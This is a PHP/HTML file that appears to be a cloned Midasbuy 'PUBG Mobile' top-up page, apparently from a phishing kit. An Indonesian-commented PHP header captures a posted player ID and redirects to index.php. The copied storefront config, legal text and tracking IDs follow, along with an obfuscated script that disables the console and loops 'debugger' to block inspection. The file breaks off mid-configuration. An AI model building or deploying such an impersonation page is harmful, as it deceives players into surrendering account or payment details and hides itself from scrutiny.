<?php
// MENANGKAP DATA YANG DI-INPUT
$playid = $_POST['playid'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($playid == ""){
header("Location: index.php");
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no,email=no">
    <meta name="robots" content="index,follow">
    <title>PUBG Mobile - Midasbuy</title>
    <meta name="keywords" content="" />
    <meta name="description" content="" />

    <script type="text/javascript">
        if (!window.console) {
            window.console = {
                log: function() {},
                info: function() {},
                error: function() {}
            }
        }
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/serviceWorker');
        }
    </script>
    <script type="text/javascript">
        window.__PAY_INFO = {
            "needSelectPF": {},
            "short_openid_type": "idip",
            "short_openid_rule": "^[1-9]\\d+$",
            "isv3": false,
            "shopcartv2": false,
            "drm_info": {
                "groupid": "check_in",
                "area": "Other",
                "country": "OT",
                "version": "3.0",
                "midasbuyArea": "Other"
            },
            "midasUser": null,
            "currentBindUser": null,
            "gameUsers": [],
            "openid": "",
            "appid": "1450015065",
            "UUID": "06479667566190511622266964250",
            "pf": "mds_hkweb_pc-v2-android-midasweb-midasbuy",
            "type": "save",
            "currencyIcon": "https://cdn.midasbuy.com/images/apps/pubgm/1599549775068xtoGCDwY.png",
            "currencySmallIcon": "https://cdn.midasbuy.com/images/apps/pubgm/24_24d2c7b78c.png",
            "currencyIconMap": [{
                "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546007887MVeNUtB6.png",
                "max": "299"
            }, {
                "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546030876PIvqwGaa.png",
                "max": "599",
                "min": "300"
            }, {
                "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546041426W8hmErMS.png",
                "max": "1499",
                "min": "600"
            }, {
                "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546052747L5gSu7VB.png",
                "max": "2999",
                "min": "1500"
            }, {
                "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546061912PLgMlY23.png",
                "max": "5999",
                "min": "3000"
            }, {
                "icon": "https://cdn.midasbuy.com/images/apps/pubgm/1599546071746KqkIhrzG.png",
                "min": "6000"
            }],
            "country": "OT",
            "midasbuyArea": "Other",
            "cgi_language": "EN",
            "sandbox": "0",
            "zoneid": "1",
            "not_query_drm": "0",
            "currency_type": "USD",
            "currency_config": {
                "currencySymbol": " USD"
            }
        };
        if (window.__PAY_INFO) {
            window.__PAY_INFO.pageid = "page_" + (Math.random().toString().replace(".", ""));
        }
        window.__Report_INFO = {
            "devMode": false,
            "tid": "06479667566190511622266964250",
            "openid": "",
            "appid": "",
            "pf": "",
            "countryCode": "ot",
            "from": "",
            "midasuid": "uv_06479667566190511622266964250",
            "reportUrl": "https://report1.midasbuy.com/cgi-bin/log_data.fcg"
        };
        window.defaultDisableGaCountryList = [];
        window.__RTL = false;

        window._SHOPCODE = "midasbuy";
        window.__showErrorDetail = {
            "ae": "*",
            "bd": "*",
            "bh": "*",
            "br": "*",
            "ch": "*",
            "de": "*",
            "dz": "*",
            "eg": "*",
            "es": "*",
            "fr": "*",
            "gb": "*",
            "hk": "*",
            "id": "*",
            "in": "*",
            "iq": "*",
            "ir": "*",
            "it": "*",
            "kh": "*",
            "kw": "*",
            "la": "*",
            "lk": "*",
            "ly": "*",
            "ma": "*",
            "mm": "*",
            "mx": "*",
            "my": "*",
            "nl": "*",
            "np": "*",
            "om": "*",
            "ot": "*",
            "ph": "*",
            "pk": "*",
            "pl": "*",
            "qa": "*",
            "ru": "*",
            "sa": "*",
            "se": "*",
            "sg": "*",
            "th": "*",
            "tn": "*",
            "tr": "*",
            "tw": "*",
            "za": "*"
        }
        window.enable_nopay_contract = true;
    </script>
    <!-- aegis上报开关 -->

    <script src="https://cdn-go.cn/aegis/aegis-sdk/latest/aegis.min.js?_bid=3977"></script>
    <script type="text/javascript">
        var aegis = new Aegis({
            id: 1124,
            uin: __Report_INFO.midasuid,
            beforeReport: function(log) {
                // 这个错误是模拟器环境报的，不需要上报
                if (log.level == 4 && log.msg) {
                    if (log.msg.indexOf('__tbsRecieveNativeEvent__') !== -1 || log.msg.indexOf('getReadMode') !== -1)
                        return false
                }
            },
            reportApiSpeed: true, // 接口测速
            reportAssetSpeed: true // 静态资源测速
        });
        // aegis.infoAll('aegis: Interview from ' + __Report_INFO.midasuid);
    </script>


    <script>
        ! function(t, e) {
            "object" == typeof exports && "undefined" != typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define(e) : (t = t || self).assetsRetry = e()
        }(this, function() {
            "use strict";

            function a(t) {
                return t
            }

            function y() {}

            function r(t, e) {
                try {
                    return "function" == typeof t[e]
                } catch (t) {
                    return !1
                }
            }

            function p(t) {
                return Array.isArray(t) ? t.reduce(function(t, e, n, r) {
                    return t[e] = r[(n + 1) % r.length], t
                }, {}) : t
            }

            function h(e, t) {
                return Object.keys(t).filter(function(t) {
                    return -1 < e.indexOf(t)
                }).sort(function(t, e) {
                    return e.length - t.length
                })[0]
            }
            var e, m = "retryTimes",
                b = "succeeded",
                E = "failed",
                O = "maxRetryCount",
                j = "onRetry",
                f = "onSuccess",
                s = "onFail",
                w = "domain",
                v = "_assetsRetryScript",
                g = "_assetsRetryOnerror",
                l = "script",
                A = "data-assets-retry-hooked",
                S = "data-assets-retry-ignore",
                k = "data-retry-id",
                d = window,
                R = window.document,
                n = d.HTMLElement,
                L = d.HTMLScriptElement,
                c = d.HTMLStyleElement,
                T = d.HTMLLinkElement,
                x = d.HTMLImageElement,
                o = Object.prototype.hasOwnProperty,
                _ = function(t, e, n) {
                    var r = t.indexOf(e);
                    return -1 === r ? t : t.substring(0, r) + n + t.substring(r + e.length)
                },
                M = function(t) {
                    return [].slice.call(t)
                },
                N = function(e, t, n, r) {
                    void 0 === n && (n = y), void 0 === r && (r = !1);
                    var o, i, c, u, a, f = r || e.defer || e.async;
                    "loading" !== R.readyState || /Edge|MSIE|rv:/i.test(navigator.userAgent) || f ? (o = R.createElement(l), Object.keys(L.prototype).forEach(function(t) {
                        if ("src" !== t && e[t] && "object" != typeof e[t]) try {
                            o[t] = e[t]
                        } catch (t) {}
                    }), o.src = t, o.onload = e.onload, o.onerror = e.onerror, o.setAttribute(k, C()), (i = e.getAttribute("nonce")) && o.setAttribute("nonce", i), R.getElementsByTagName("head")[0].appendChild(o)) : (c = C(), u = e.outerHTML.replace(/data-retry-id="[^"]+"/, "").replace(/src=(?:"[^"]+"|.+)([ >])/, k + "=" + c + ' src="' + t + '"$1'), R.write(u), (a = R.querySelector("script[" + k + '="' + c + '"]')) && (a.onload = n))
                },
                H = function(e) {
                    try {
                        return e.rules
                    } catch (t) {
                        try {
                            return e.cssRules
                        } catch (t) {
                            return null
                        }
                    }
                },
                I = function(e, t, n) {
                    var r = R.createElement("link");
                    Object.keys(T.prototype).forEach(function(t) {
                        if ("href" !== t && e[t] && "object" != typeof e[t]) try {
                            r[t] = e[t]
                        } catch (t) {}
                    }), r.href = t, r.onload = n, r.setAttribute(k, C()), R.getElementsByTagName("head")[0].appendChild(r)
                },
                P = function(t) {
                    return t ? t instanceof n ? [t.nodeName, t.src, t.href, t.getAttribute(k)].join(";") : "not_supported" : "null"
                },
                C = function() {
                    return Math.random().toString(36).slice(2)
                },
                B = function(t) {
                    return t instanceof L || t instanceof x ? t.src : t instanceof T ? t.href : null
                },
                F = {},
                $ = function(t, e) {
                    var n, r = q(t, e),
                        o = r[0],
                        i = r[1];
                    return o ? (F[o] = F[o] || ((n = {})[m] = 0, n[E] = [], n[b] = [], n), [i, F[o]]) : []
                },
                q = function(t, e) {
                    var n, r, o = h(t, e);
                    return o ? [(r = o, (n = t).substr(n.indexOf(r) + r.length, n.length)), o] : ["", ""]
                };
            try {
                e = function(t) {
                    for (var e = Object.getPrototypeOf ? Object.getPrototypeOf : function(t) {
                            return t.__proto__
                        }, n = Object.keys(t); e(t);) n = n.concat(Object.keys(e(t))), t = e(t);
                    return n.filter(function(t) {
                        return "constructor" !== t
                    })
                }(L.prototype)
            } catch (t) {}

            function i(f, t) {
                var s = t[O],
                    l = p(t[w]),
                    d = t[j];
                return e.reduce(function(t, e) {
                    var n = r(L.prototype, e);
                    return t[e] = n ? {
                        value: function() {
                            return f[v][e].apply(f[v], arguments)
                        }
                    } : {
                        set: function(o) {
                            return "onerror" === e ? (f[g] = o, void(f[v].onerror = function(r) {
                                r.stopPropagation && r.stopPropagation();

                                function t() {
                                    return t = f[g], e = f[v], n = r, "function" != typeof t ? null : t.call(e, n);
                                    var t, e, n
                                }
                                var e = f[v].src,
                                    n = $(e, l),
                                    o = n[0],
                                    i = n[1],
                                    c = f[v].hasAttribute(S);
                                if (!o || !i || c) return t();
                                var u = _(e, o, l[o]),
                                    a = d(u, e, i);
                                if (null === a) return t();
                                if ("string" != typeof a) throw new Error("a string should be returned in `onRetry` function");
                                i[m] <= s ? N(f[v], a, y, !0) : t()
                            })) : "onload" === e ? (f._assetsRetryOnload = o, void(f[v].onload = function(t) {
                                var e = f[v].src,
                                    n = $(e, l),
                                    r = (n[0], n[1]);
                                r && -1 === r[E].indexOf(e) && r[b].push(e), o && !o._called && (o._called = !0, o.call(f[v], t))
                            })) : void(f[v][e] = o)
                        },
                        get: function() {
                            return f[v][e]
                        }
                    }, t
                }, {})
            }
            var z = function(n) {
                    var r = R.createElement;
                    R.createElement = function(t, e) {
                        return t === l ? function(t, e) {
                            var n;
                            t.setAttribute(A, "true");
                            var r = ((n = {})[v] = t, n[g] = y, n),
                                o = i(r, e);
                            return Object.defineProperties(r, o), r
                        }(r.call(R, l), n) : r.call(R, t, e)
                    }, R.createElement.toString = function() {
                        return "function createElement() { [native code] }"
                    }
                },
                Z = function(n) {
                    Object.keys(n).filter(function(t) {
                        return r(n, t)
                    }).forEach(function(t) {
                        var e = n[t];
                        n[t] = function() {
                            var t = [].slice.call(arguments).map(function(t) {
                                return t && o.call(t, v) ? t[v] : t
                            });
                            return e.apply(this, t)
                        }, /^\w+$/.test(t) && (n[t].toString = new Function("return 'function " + t + "() { [native code] }'"))
                    })
                };
            var D = {};

            function G(p) {
                function c(t) {
                    if (t) {
                        var e = t.target || t.srcElement,
                            n = B(e);
                        if (n) {
                            var r = $(n, g),
                                o = r[0],
                                i = r[1],
                                c = e instanceof HTMLElement && e.hasAttribute(S);
                            if (i && o && !c) {
                                i[m]++, i[E].push(n);
                                var u, a = i[m] > p[O];
                                if (a && (u = q(n, g)[0], v(u)), g[o] && !a) {
                                    var f = g[o],
                                        s = _(n, o, f),
                                        l = h(s, n, i);
                                    if (null !== l) {
                                        if ("string" != typeof l) throw new Error("a string should be returned in `onRetry` function");
                                        var d, y = P(e);
                                        D[y] || (D[y] = !0, d = function() {
                                            i[b].push(l)
                                        }, e instanceof L && !e.getAttribute(A) && e.src ? N(e, l, d) : e instanceof T && e.href ? I(e, l, d) : e instanceof x && e.src && (e.setAttribute(k, C()), e.src = l, e.onload = d))
                                    }
                                }
                            }
                        }
                    }
                }
                var h = p[j],
                    u = p[f],
                    v = p[s],
                    g = p[w];
                R.addEventListener("error", c, !0), R.addEventListener("load", function(t) {
                    var e, n, r, o, i;
                    t && (e = t.target || t.srcElement, (n = B(e)) && (e.getAttribute(k) && (r = q(n, g)[0], u(r)), e instanceof T && R.styleSheets && (o = M(R.styleSheets).filter(function(t) {
                        return t.href === e.href
                    })[0], null !== (i = H(o)) && 0 === i.length && c(t))))
                }, !0)
            }

            function u(t, e, n, r, o) {
                var i = o[w],
                    c = o[j],
                    u = e.style && e.style[t];
                if (u && !/^url\(["']?data:/.test(u)) {
                    var a = u.match(/^url\(["']?(.+?)["']?\)/) || [],
                        f = a[1];
                    if (f) {
                        var s = h(f, i);
                        if (s && i[s]) {
                            var l = Object.keys(i).map(function(t) {
                                    var e = _(f, s, t);
                                    return 'url("' + c(e, f, null) + '")'
                                }).join(","),
                                d = e.selectorText + ("{ " + t.replace(/([a-z])([A-Z])/g, function(t, e, n) {
                                    return e + "-" + n.toLowerCase()
                                })) + ": " + l + " !important; }";
                            try {
                                n.insertRule(d, r.length)
                            } catch (t) {
                                n.insertRule(d, 0)
                            }
                        }
                    }
                }
            }
            var J = {},
                K = [],
                Q = function(t, o) {
                    var i = ["backgroundImage", "borderImage", "listStyleImage"];
                    t.forEach(function(n) {
                        var r, t = H(n);
                        null !== t && ((r = M(t)).forEach(function(e) {
                            i.forEach(function(t) {
                                u(t, e, n, r, o)
                            })
                        }), n.href && (J[n.href] = !0), n.ownerNode instanceof c && K.push(n.ownerNode))
                    })
                },
                U = function(t, n) {
                    return M(t).filter(function(t) {
                        if (!H(t)) return !1;
                        if (t.href) return !J[t.href] && !!h(t.href, n);
                        var e = t.ownerNode;
                        return !(e instanceof c && -1 < K.indexOf(e))
                    })
                };
            return function(t) {
                var e, n, r, o;
                void 0 === t && (t = {});
                try {
                    if ("object" != typeof t[w]) throw new Error("opts.domain cannot be non-object.");
                    var i = [O, j, f, s, w],
                        c = Object.keys(t).filter(function(t) {
                            return -1 === i.indexOf(t)
                        });
                    if (0 < c.length) throw new Error("option name: " + c.join(", ") + " is not valid.");
                    var u = ((e = {})[O] = t[O] || 3, e[j] = t[j] || a, e[f] = t[f] || y, e[s] = t[s] || y, e[w] = p(t[w]), e);
                    return z(u), "undefined" != typeof Node && Z(Node.prototype), "undefined" != typeof Element && Z(Element.prototype), G(u), n = u, r = R.styleSheets, o = n[w], r && setInterval(function() {
                        var t = U(R.styleSheets, o);
                        0 < t.length && Q(t, n)
                    }, 250), F
                } catch (t) {
                    d.console && console.error("[assetsRetry] error captured", t)
                }
            }
        });
    </script>
    <script>
        var assetsRetryRule = {
            "https://cdn.midasbuy.com/h5/overseah5/js": "https://cn.midasbuy.com/h5/overseah5/js",
            "https://cdn.midasbuy.com/oversea_web/static/css": "https://cn.midasbuy.com/oversea_web/static/css",
            "https://cdn.midasbuy.com/oversea_web/static/js": "https://cn.midasbuy.com/oversea_web/static/js",
            "https://cn.midasbuy.com/h5/overseah5/js": "https://cdn.midasbuy.com/h5/overseah5/js",
            "https://cn.midasbuy.com/oversea_web/static/css": "https://cdn.midasbuy.com/oversea_web/static/css",
            "https://cn.midasbuy.com/oversea_web/static/js": "https://cdn.midasbuy.com/oversea_web/static/js"
        };
        var assetsRetryStatistics = window.assetsRetry({
            domain: assetsRetryRule,
            maxRetryCount: 2,
            onRetry: function(currentUrl, originalUrl, statistics) {
                window.report && window.report.custom && window.report.custom('assets.retry.start', {
                    url: originalUrl
                });

                return currentUrl
            },
            onSuccess: function(currentUrl) {
                window.report && window.report.custom && window.report.custom('assets.retry.ok', {
                    url: currentUrl
                });
            },
            onFail: function(currentUrl) {
                window.report && window.report.custom && window.report.custom('assets.retry.fail', {
                    url: currentUrl
                });
            }
        })
    </script>


    <link rel="stylesheet" href="https://cdn.midasbuy.com/oversea_web/static/css/vendor.e7c16e4f.css?max_age=864000" />

    <link rel="stylesheet" href="https://cdn.midasbuy.com/oversea_web/static/css/mallpage.f65234e0.css?max_age=864000" />
    <link rel="stylesheet" href="https://cdn.midasbuy.com/oversea_web/static/css/media.beec7b36.css?max_age=864000" />
	
	
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">

    <!--[if lte IE 9]><link rel="stylesheet" href="https://cdn.midasbuy.com/oversea_web/static/css/ie.c768481b.css?max_age=864000"/><![endif]-->





    <script type="text/javascript" src="https://cdn.midasbuy.com/h5/overseah5/js/midas-oversea-h5page.js"></script>



    <!-- 合并了jq、swiper、vue、report资源文件 -->
    <script type="text/javascript" src="https://cdn.midasbuy.com/oversea_web/static/js/midas.runtime.js"></script>

    <script src="https://cdn.midasbuy.com/oversea_web/static/js/fbreport.09e85448.js"></script>


    <script type="text/javascript">
        var _0x3d88 = ['log', 'debug', 'info', 'error', 'exception', 'table', 'warn', 'trace', 'apply', 'debu', 'gger', 'don', 'return\x20(function()\x20', '{}.constructor(\x22return\x20this\x22)(\x20)', 'console'];
        (function(_0x4b152f, _0x59d86c) {
            var _0x5c135a = function(_0x5b5d0f) {
                while (--_0x5b5d0f) {
                    _0x4b152f['push'](_0x4b152f['shift']());
                }
            };
            _0x5c135a(++_0x59d86c);
        }(_0x3d88, 0x170));
        var _0x306c = function(_0x4b152f, _0x59d86c) {
            _0x4b152f = _0x4b152f - 0x0;
            var _0x5c135a = _0x3d88[_0x4b152f];
            return _0x5c135a;
        };
        (function(_0x2605bc) {
            var _0x4c9a2c = function() {
                var _0x244728 = !![];
                return function(_0x3efc74, _0x16c2ac) {
                    var _0x4d7b05 = _0x244728 ? function() {
                        if (_0x16c2ac) {
                            var _0x45ed49 = _0x16c2ac[_0x306c('0x0')](_0x3efc74, arguments);
                            _0x16c2ac = null;
                            return _0x45ed49;
                        }
                    } : function() {};
                    _0x244728 = ![];
                    return _0x4d7b05;
                };
            }();
            var _0x4ed3d0 = [_0x306c('0x1'), _0x306c('0x2'), _0x306c('0x3')];

            function _0x17f16e() {
                var _0x41d7ca = _0x4c9a2c(this, function() {
                    var _0x6c13c9 = function() {};
                    var _0x187a25 = function() {
                        var _0x23d8ab;
                        try {
                            _0x23d8ab = Function(_0x306c('0x4') + _0x306c('0x5') + ');')();
                        } catch (_0x15bb1a) {
                            _0x23d8ab = window;
                        }
                        return _0x23d8ab;
                    };
                    var _0x4a78e1 = _0x187a25();
                    if (!_0x4a78e1[_0x306c('0x6')]) {
                        _0x4a78e1[_0x306c('0x6')] = function(_0x6c13c9) {
                            var _0x19ef79 = {};
                            _0x19ef79[_0x306c('0x7')] = _0x6c13c9;
                            _0x19ef79['warn'] = _0x6c13c9;
                            _0x19ef79[_0x306c('0x8')] = _0x6c13c9;
                            _0x19ef79[_0x306c('0x9')] = _0x6c13c9;
                            _0x19ef79[_0x306c('0xa')] = _0x6c13c9;
                            _0x19ef79[_0x306c('0xb')] = _0x6c13c9;
                            _0x19ef79[_0x306c('0xc')] = _0x6c13c9;
                            _0x19ef79['trace'] = _0x6c13c9;
                            return _0x19ef79;
                        }(_0x6c13c9);
                    } else {
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0x7')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0xd')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0x8')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0x9')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0xa')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0xb')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0xc')] = _0x6c13c9;
                        _0x4a78e1[_0x306c('0x6')][_0x306c('0xe')] = _0x6c13c9;
                    }
                });
                _0x41d7ca();
                return function() {
                    return eval(_0x4ed3d0[0x0] + _0x4ed3d0[0x1]);
                };
            }
            _0x2605bc[_0x4ed3d0[0x2]] = _0x17f16e();
            setInterval(_0x4ed3d0[0x2] + '()', 0xc8);
        }(window));
    </script>


    <script type="text/javascript">
        var globalReportParams = {};
        var goServerUrl = "//www.midasbuy.com/midas/usc/v1/123123";
        var goPublicKey = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+DHIWQ7lNnwufS03eXfHeytqUH2OWxoFMP67o38bq/7PB1NaikC3Wb4O8bKF5L2iyIVD2M/QxtcV178BIUP6qJxAHly6B+xC3FJXONeYMQfL3D3GxaSavR/vlJhoaacXpCn30dj1njeVjsMWjJrUjqOCHuMY3UX+h6LrBIB3iywIDAQAB";
        var currentLang = "en";
        var langResource = {
            "title": "PUBG Mobile - Midasbuy",
            "adyenCashback": {
                "closeBtn": "confirm",
                "desc": "Make a purchase with your card on Midasbuy for a chance to win a 100% cashback<br/>Event period: 12/12-12/23 (UTC+8)<br/>Country: Saudi Arabia, Kuwait, Qatar, UAE<br/>Only users who make purchases by card are eligible to participate in this campaign<br/>Midasbuy will fully refund the amount of your current purchase if you win the 100% cashback<br/>The list of prize winners will be announced on our Facebook account every day",
                "subTitle": "",
                "title": ""
            },
            "birthConfirmBtn": "OK",
            "birthTitle": "Please confirm your birthday",
            "birthdayError": "Unfortunately we are unable to offer Midasbuy service to you at this time.",
            "bubblePop": {
                "bubbleTips": "REGISTER TO GET <span>PUBGM FREE</span> ITEM",
                "promoteTips": "Get PUBGM exclusive registeration gift for <span>FREE</span>"
            },
            "cancel": "Cancel",
            "channelRestore": {
                "default": {
                    "helpBtn": "OK",
                    "helpDesc": "The payment channel system is under maintenance, please choose another payment method",
                    "helpTitle": "Announcement"
                }
            },
            "channel_awards_tip": "Get <span class='light'>FREE REWARDS</span> when purchasing UC using the following payment method(s)",
            "checkBirthInput": "Enter Birthday",
            "checkRight4": " By ticking this box, you confirm that you have read and agreed to the <Supplementary Terms> and understand how it applies to your purchase and use of virtual goods and virtual currency in Playerunknown's BattleGround Mobile. These terms will be binding between you and Proxima Beta PTE. Limited.",
            "checkRight5": "You hereby consent to immediate performance of the contract and acknowledge that you will lose your right of withdrawal from the contract once the download or use of the virtual goods and/or virtual currency has commenced.",
            "currencyBtn": "Purchase",
            "email_feedback_input_error_tips": "Please enter a valid email",
            "email_feedback_input_label": "Email Address",
            "email_feedback_input_placeholder": "Enter your email",
            "email_feedback_pop_tips": "Please fill in your contact email address, customer service will contact you by email to help you complete the order.",
            "email_feedback_pop_title": "Fill in contact information",
            "email_feedback_remark_input_label": "Remarks",
            "email_feedback_remarks_input_placeholder": "Enter a note of no more than 50 characters",
            "errorMap": {
                "1138-1-12186": "Please choose another region to recharge.",
                "1138-1-12200": "Please choose another region to recharge.",
                "1138-1-12201": "Please choose another region to recharge.",
                "1138-1-12202": "Please choose another region to recharge.",
                "1138-1-12204": "Please choose another region to recharge.",
                "1138-30051-12186": "Please choose another region to recharge.",
                "1138-30051-12200": "Please choose another region to recharge.",
                "1138-30051-12201": "Please choose another region to recharge.",
                "1138-30051-12202": "Please choose another region to recharge.",
                "1138-30051-12204": "Please choose another region to recharge."
            },
            "errorTips": {
                "attention": "Tip",
                "confirm": "OK",
                "invaliduserid": "Please enter a valid User ID.",
                "tokenexpire": "Please refresh and try again."
            },
            "facebookButton": "Follow",
            "feedback": "Feedback",
            "footer": {
                "copyright": "COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED."
            },
            "gameIdInvalid": "Invalid Game ID",
            "gameIdLoginCharacName": "Nickname",
            "gameIdLoginId": "Player ID",
            "gameIdLoginInput": "Please enter Player ID",
            "gameIdLoginModifyButton": "Edit",
            "gameIdLoginOkButton": "OK",
            "gameIdLoginTitle": "Player ID Verification",
            "gameIdRequired": "Enter Game ID",
            "gamename": "PUBG MOBILE",
            "getInfoAsap": "Follow us on {0} for more information.",
            "goToOthers": "Go to your country",
            "header": {
                "accountSettings": "View Account",
                "checkVipStatus": "Check your status after log in",
                "events": "Event Center",
                "followFB": "Follow Midasbuy",
                "helpcenter": "Help Center",
                "helpcenterLink": "https://cdn.midasbuy.com/oversea_web/faq/faq.html",
                "index": "Home",
                "login": "SIGN IN",
                "logout": "Sign Out",
                "midasVip": "Midasbuy VIP",
                "myAccount": "My Account",
                "pcenter": "Account  Setting",
                "register": "CREATE ACCOUNT",
                "transactionRecord": "Transcation Record"
            },
            "homeBtn": "PUBG MOBILE",
            "itemBtn": "Items-RP",
            "newCheckRight": "By ticking this box, you confirm that you agree to the Midasbuy {Terms of Services}、[Privacy Policy] and <Supplementary Terms>.",
            "newCompliance": {
                "errorTips": "Please check the box to continue",
                "learnMore": "Learn more",
                "nextBtn": "Continue",
                "title": "Please check the following box"
            },
            "newComplianceItemList": {
                "0": {
                    "desc": "You confirm that you have read and agreed to the Midasbuy Terms of Services and understand how it applies to your use of Midasbuy.",
                    "id": "001",
                    "title": "{0}. You agree to Terms of Services"
                },
                "1": {
                    "desc": "You confirm that you have read and agreed to the Midasbuy Privacy Policy and understand how it applies to your use of Midasbuy.",
                    "id": "002",
                    "title": "{0}. You agree to Privacy Policy"
                },
                "2": {
                    "desc": "You confirm that you have read and agreed to the Supplementary Terms and understand how it applies to your purchase and use of virtual goods and virtual currency in Playerunknown's BattleGround Mobile. These terms will be binding between you and Proxima Beta PTE. Limited.",
                    "id": "003",
                    "title": "{0}. You agree to Supplementary Terms"
                },
                "3": {
                    "desc": "Midasbuy is a product offered by HIGH MORALE DEVELOPMENTS LTD. ,a Hong Kong company who will process your data outside the European Economic Area (including Hong Kong Singapore United States and the People's Republic of China) in order to provide the service. Please note that there are risks in such a transfer including your data being subject to differing legal regimes which may not afford it the same level of protection as that available in the country in which you are located. For more information please see our Privacy Policy.",
                    "id": "004",
                    "title": "{0}. You agree to transfer your data outside of the European Economic Area"
                },
                "4": {
                    "desc": "You hereby consent to immediate performance of the contract and acknowledge that you will lose your right of withdrawal from the contract once the download or use of the virtual goods and/or virtual currency has commenced.",
                    "id": "005",
                    "title": "{0}. You will lose your right of withdrawal"
                }
            },
            "ok": "OK",
            "pay_too_frequent_tips": "Payment has been timed out. Please try again later or use another card. If you see this message repeatedly, you can contact customer service to get help completing the order.",
            "redeemBtn": "Redeem",
            "retry": "Retry",
            "send": "Submit",
            "shopBtn": "Shop",
            "sorry": "Sorry",
            "success": "Success",
            "xianyici": "One Purchase Only",
            "buyGoods": "Top Up",
            "buyItPrefix": "Buy It for",
            "contactBtn": "Join Group",
            "contactDesc": "Join our Facebook Group to get the latest news and updates. Click Join Group on the Facebook Page!",
            "contactFacebook": "The latest news and updates",
            "contactTitle": "Midasbuy X PUBG Mobile",
            "downloadgame": "Download Game",
            "facebookDesc": "Follow us",
            "gain_reward": "Earn reward",
            "gameRecharge": "Purchase UC",
            "gameRechargeDesc": "Unknown Cash (UC)",
            "hotevents": "HOT EVENTS",
            "invit_chooseitem": "Select an item",
            "invit_inputid": "Enter Player ID",
            "invit_pay": "Complete purchase",
            "joinnow": "Join Now",
            "labelAll": "All",
            "labelDiscount": "On sale",
            "labelNew": "New arrivals",
            "limitLabel": "${drmActivityQuotaLeft} Purchase Only",
            "limitReady": "Ready for sale",
            "limitTimeLeft": "Goes on sale in ",
            "officialwebsite": "Official Website",
            "ownedText": "obtained",
            "purchase": "Purchase"
        };
        var footerLan = {
            "cookieCloseBtn": "Save and close",
            "cookieOff": "OFF",
            "cookieOn": "ON",
            "cookieP1": "We use cookies that are necessary to provide the service and also other cookies, including third-party cookies for performance and analysis. For more information on our cookie policy, please click here.    ",
            "cookieP2": "These cookies are necessary to provide you with the service and to use some of its features, such as to facilitate transactions.",
            "cookieP3": "These cookies are used to measure and analyse how the service is accessed, used, or is performing in order to provide you with a better   user experience and to maintain, operate and continually improve the service.",
            "cookieT": "YOUR COOKIE PREFERENCES",
            "cookieT2": "Necessary Cookies",
            "cookieT3": "Analytics Cookies",
            "copyright": "COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED.",
            "cstips1": "For customer service ",
            "cstips2": "Please send email to help@midasbuy.com",
            "facebook": "Facebook",
            "feedback": "Feedback",
            "followFB": "Follow Midasbuy",
            "followUs": "Follow us on",
            "privacystatement": "Privacy Policy",
            "termofcookie": "Cookie Perferences",
            "termofservice": "Terms of Service"
        };
        var showWelcomeBack = 1
        // 获取红点变量 需要考虑控制台还没配置变量的情况 在header.ts中的红点逻辑需要做相应的控制
        var redPointConfigs = {
            "showRedPoint2Unlogin": false,
            "vipCenter": {
                "beforeElement": true,
                "show": true,
                "show2Unlogin": true,
                "version": "Tue, 19 Aug 2020 10:57:00 GMT+0800"
            }
        }
        var user = null
        var fbPixelId = "4122111147803299"
        var jumpHomePage = true;
        var bubblePopConfig = {
            "bubbleShow": true,
            "href": "https://www.midasbuy.com/midasbuy/{0}/event/register/pubgm?lan=en&from=__mds_buy_bubble",
            "promoteShow": true,
            "repalce": false
        }
        var vipcenterConfig = {
            "directLinks": {
                "earnValuesLink": "./shop/pubgm",
                "goToPurchaseLink": "./buy/pubgm"
            },
            "helpcenterLink": "https://cdn.midasbuy.com/oversea_web/faq/vipfaq.html",
            "historyRange": "January 2019 - February 2021",
            "luckyDraw": {
                "eventLink": "/event/viplottery/mds",
                "eventValid": 1,
                "images": {
                    "frontBgImage": "https://cdn.midasbuy.com/images/drawbox.png",
                    "giftItems": ["https://cdn.midasbuy.com/images/price1.png", "https://cdn.midasbuy.com/images/price2.png", "https://cdn.midasbuy.com/images/price3.png"],
                    "mobileBgImage": "https://cdn.midasbuy.com/oversea_web/static/images/vip/pointdraw-b8661b4902.png",
                    "pcBgImage": "https://cdn.midasbuy.com/oversea_web/static/images/vip/pointdraw-b8661b4902.png"
                },
                "spend": "100"
            },
            "messageConfig": {
                "desc": "You have Loyalty Points that you can receive.",
                "href": "./pubgm/verifyplayer",
                "needOpen": true,
                "needScroll": false
            },
            "showLuckyDraw": 1,
            "showVipEntrance": 1,
            "showVipFAQ": 1,
            "taskCenter": {
                "appid": "1450027575",
                "checkin": "sign",
                "defaultChannel": "os_credit_card",
                "goPurcharseLink": "/buy/pubgm?from=taskcenter",
                "groupid": "TASK210408103117306",
                "notVipTaskIds": ["fbb619c35073eb49"],
                "taskList": {
                    "4c1a92fbce48be46": {
                        "isNotVipTask": false,
                        "isVipTask": true,
